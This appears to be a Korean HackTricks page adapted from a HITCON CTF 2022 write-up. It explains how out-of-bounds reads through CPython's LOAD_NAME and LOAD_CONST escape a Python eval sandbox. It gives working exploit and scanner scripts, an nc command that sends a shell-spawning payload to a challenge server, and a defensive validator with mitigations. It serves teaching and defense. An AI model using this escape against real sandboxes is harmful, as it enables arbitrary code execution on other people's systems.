# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**이 정보는** [**이 writeup에서 가져왔습니다**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD_NAME / LOAD_CONST opcode의 OOB read 기능을 사용하여 메모리에서 일부 symbol을 가져올 수 있습니다. 즉, `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)`와 같은 trick을 사용해 원하는 symbol(예: function name)을 가져올 수 있습니다.

그런 다음 exploit을 작성하면 됩니다.

### 개요 <a href="#overview-1" id="overview-1"></a>

소스 코드는 매우 짧으며, 단 4줄만 포함합니다!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
임의의 Python 코드를 입력할 수 있으며, 해당 코드는 [Python code object](https://docs.python.org/3/c-api/code.html)로 컴파일됩니다. 그러나 해당 code object를 eval하기 전에 `co_consts`와 `co_names`가 빈 튜플로 대체됩니다.

따라서 이러한 방식에서는 consts(예: 숫자, 문자열 등) 또는 names(예: 변수, 함수)를 포함하는 모든 expression이 결국 segmentation fault를 일으킬 수 있습니다.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

segfault는 어떻게 발생할까요?

간단한 예제부터 살펴보겠습니다. `[a, b, c]`는 다음과 같은 bytecode로 컴파일될 수 있습니다.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
하지만 `co_names`가 빈 tuple이 되면 어떻게 될까요? `LOAD_NAME 2` opcode는 여전히 실행되며, 원래 읽어야 했던 해당 memory address에서 값을 읽으려고 시도합니다. 그렇습니다. 이것은 out-of-bound read "feature"입니다.

solution의 핵심 개념은 간단합니다. CPython의 일부 opcode, 예를 들어 `LOAD_NAME`과 `LOAD_CONST`는 OOB read에 취약합니다(?).

이들은 `consts` 또는 `names` tuple에서 `oparg` 인덱스의 object를 가져옵니다(`co_consts`와 `co_names`가 내부적으로 가리키는 것이 바로 이것입니다). CPython이 `LOAD_CONST` opcode를 처리할 때 어떤 작업을 수행하는지 확인하려면 다음의 짧은 snippet을 참고할 수 있습니다.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
이런 방식으로 OOB 기능을 사용하면 임의의 메모리 offset에서 `"name"`을 가져올 수 있습니다. 해당 name이 무엇인지, 그리고 offset이 얼마인지 확인하려면 `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ...를 계속 시도하면 됩니다. 그러면 oparg > 700 정도에서 무언가를 찾을 수 있습니다. 물론 gdb를 사용해 memory layout을 살펴볼 수도 있지만, 더 쉬울 것 같지는 않습니다.

### Exploit 생성하기 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

name / const에 대한 유용한 offset을 확인했다면, 어떻게 그 offset에서 name / const를 가져와 사용할 수 있을까요? 다음과 같은 trick이 있습니다:\  
`co_names=()`인 상태에서 offset 5(`LOAD_NAME 5`)에서 `__getattribute__` name을 가져올 수 있다고 가정하면, 다음과 같이 하면 됩니다:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> `__getattribute__`로 이름을 지정할 필요는 없으며, 더 짧거나 더 특이한 이름으로 지정할 수도 있습니다.

바이트코드만 확인해도 그 이유를 이해할 수 있습니다:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR`도 `co_names`에서 name을 가져옵니다. Python은 name이 동일하면 같은 offset에서 name을 로드하므로, 두 번째 `__getattribute__`도 여전히 offset=5에서 로드됩니다. 이 기능을 사용하면 해당 name이 메모리 근처에 있기만 하면 임의의 name을 사용할 수 있습니다.

숫자를 생성하는 것은 간단합니다.

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

길이 제한 때문에 consts는 사용하지 않았습니다.

먼저 name의 offset을 찾는 script부터 살펴보겠습니다.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
그리고 다음은 실제 Python exploit을 생성하기 위한 것입니다.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
기본적으로 다음 작업을 수행하며, 해당 문자열은 `__dir__` 메서드에서 가져옵니다:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### 버전 참고 사항 및 영향을 받는 opcode (Python 3.11–3.13)

- CPython bytecode opcode는 여전히 정수 피연산자를 사용해 `co_consts` 및 `co_names` 튜플을 인덱싱합니다. 공격자가 이러한 튜플을 비어 있도록(또는 bytecode에서 사용되는 최대 인덱스보다 작도록) 만들 수 있다면, interpreter는 해당 인덱스에서 범위를 벗어난 메모리를 읽어 주변 메모리에서 임의의 PyObject 포인터를 반환합니다. 관련 opcode에는 최소한 다음이 포함됩니다.
- `LOAD_CONST consti` → `co_consts[consti]`를 읽습니다.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → `co_names[...]`에서 name을 읽습니다(3.11+에서는 `LOAD_ATTR`/`LOAD_GLOBAL`이 하위 비트에 flag 비트를 저장하므로 실제 인덱스는 `namei >> 1`입니다). 버전별 정확한 의미는 disassembler docs를 참고하세요. [Python dis docs].<sup>[[2]](#references)</sup>
- Python 3.11+에서는 instruction 사이에 숨겨진 `CACHE` entry를 추가하는 adaptive/inline cache가 도입되었습니다. 이는 OOB primitive를 변경하지 않습니다. 다만 bytecode를 직접 구성하는 경우 `co_code`를 만들 때 이러한 cache entry를 고려해야 합니다.

실질적으로 이는 code object를 제어할 수 있고(예: `CodeType.replace(...)`를 통해) `co_consts`/`co_names`를 축소할 수 있다면, 이 페이지의 technique이 CPython 3.11, 3.12 및 3.13에서도 계속 작동한다는 의미입니다.

### 유용한 OOB 인덱스를 찾기 위한 간단한 scanner (3.11+/3.12+ 호환)

high-level source가 아닌 bytecode에서 직접 흥미로운 object를 탐색하려면, 최소한의 code object를 생성하고 인덱스를 brute force할 수 있습니다. 아래 helper는 필요한 경우 inline cache를 자동으로 삽입합니다.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
참고
- 대신 names를 probe하려면 `LOAD_CONST`를 `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR`로 교체하고 그에 맞게 stack 사용을 조정하세요.
- 필요한 경우 `EXTENDED_ARG` 또는 여러 바이트의 `arg`를 사용하여 255보다 큰 index에 접근하세요. 위와 같이 `dis`를 사용해 빌드할 때는 low byte만 제어할 수 있으므로, 더 큰 index의 경우 raw bytes를 직접 구성하거나 여러 번의 load로 attack을 분할하세요.

### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

`co_consts` index 중 builtins module로 resolve되는 것을 식별하면, stack을 조작하여 `co_names` 없이 `eval(input())`을 재구성할 수 있습니다:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
이 접근 방식은 `co_code`를 직접 제어할 수 있지만 `co_consts=()` 및 `co_names=()`를 강제하는 challenge(예: BCTF 2024 “awpcode”)에서 유용합니다. 이 방법은 source-level tricks를 사용하지 않으며, bytecode stack ops와 tuple builders를 활용해 payload size를 작게 유지합니다.

### sandboxes를 위한 Defensive checks 및 mitigations

신뢰할 수 없는 code를 compile/evaluate하거나 code objects를 조작하는 Python “sandbox”를 작성한다면, bytecode에서 사용되는 tuple indexes를 CPython이 bounds-check한다고 의존하지 마세요. 대신 실행 전에 code objects를 직접 validate하세요.

Practical validator (`co_consts`/`co_names`에 대한 OOB access를 거부)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
추가 완화 방안
- 신뢰할 수 없는 입력에 대해 임의의 `CodeType.replace(...)`를 허용하지 않거나, 결과로 생성된 code object에 대해 엄격한 구조 검사를 추가합니다.
- CPython semantics에 의존하는 대신, OS-level sandboxing(seccomp, job objects, containers)을 적용한 별도의 process에서 신뢰할 수 없는 code를 실행하는 방안을 고려합니다.

## References

- [1] [이 기법의 기원과 high-level exploit chain을 다룬 Splitline의 HITCON CTF 2022 writeup "V O I D"](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python disassembler docs(LOAD_CONST/LOAD_NAME 등의 indices semantics 및 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` low-bit flags)](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
